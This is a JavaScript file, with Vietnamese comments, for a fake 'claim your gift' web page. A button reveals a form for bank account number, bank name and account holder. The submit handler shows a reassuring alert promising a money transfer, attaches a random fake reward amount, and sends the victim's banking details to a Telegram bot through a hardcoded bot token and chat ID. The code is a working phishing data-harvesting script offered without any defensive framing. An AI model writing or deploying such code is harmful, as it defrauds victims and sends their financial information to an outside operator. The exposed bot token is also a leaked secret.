// Khi người dùng nhấn "Nhận Quà"
document.getElementById("claimButton").addEventListener("click", function() {
    // Hiển thị form nhập thông tin tài khoản ngân hàng
    document.getElementById("bankInfo").style.display = "block";
});

// Khi người dùng gửi thông tin tài khoản ngân hàng
document.getElementById("bankForm").addEventListener("submit", function(event) {
    event.preventDefault();  // Ngừng gửi form mặc định

    // Lấy thông tin tài khoản ngân hàng
    const accountNumber = document.getElementById("accountNumber").value.trim();
    const bankName = document.getElementById("bankName").value.trim();
    const accountHolder = document.getElementById("accountHolder").value.trim();

    if (accountNumber && bankName && accountHolder) {
        // Tạo một số tiền ngẫu nhiên để gửi
        const randomReward = Math.floor(Math.random() * 1000000); // Ví dụ: số tiền ngẫu nhiên từ 0 đến 1 triệu

        // Thông báo thành công
        alert("Đã được gửi đến Admin, chờ đến khi chủ website chuyển tiền nhé !! " + accountNumber + " Ngân Hàng " + bankName + " chủ tài khoản " + accountHolder);

        // Gửi thông tin tới Telegram
        const message = `
            Thông Tin: 
            - Số tài khoản: ${accountNumber}
            - Tên ngân hàng: ${bankName}
            - Chủ tài khoản: ${accountHolder}
            - Số tiền: ${randomReward} VND
        `;

        // Thực hiện gửi yêu cầu đến Telegram API
        sendToTelegram(message);
    } else {
        alert("Vui lòng nhập đầy đủ thông tin tài khoản ngân hàng.");
    }
});

// Hàm gửi thông tin đến Telegram
function sendToTelegram(message) {
    const botToken = "7894464079:AAFqisIEm_tNSWnHmz7CW3etO58H7nx2AO0";  // Thay bằng token bot của bạn
    const chatId = "6898590295";  // Thay bằng chat ID của bạn (hoặc kênh)

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const data = {
        chat_id: chatId,
        text: message
    };

    // Gửi dữ liệu tới Telegram API
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log("Thông tin đã được gửi tới Telegram:", data);
    })
    .catch(error => {
        console.error("Lỗi khi gửi thông tin đến Telegram:", error);
    });
}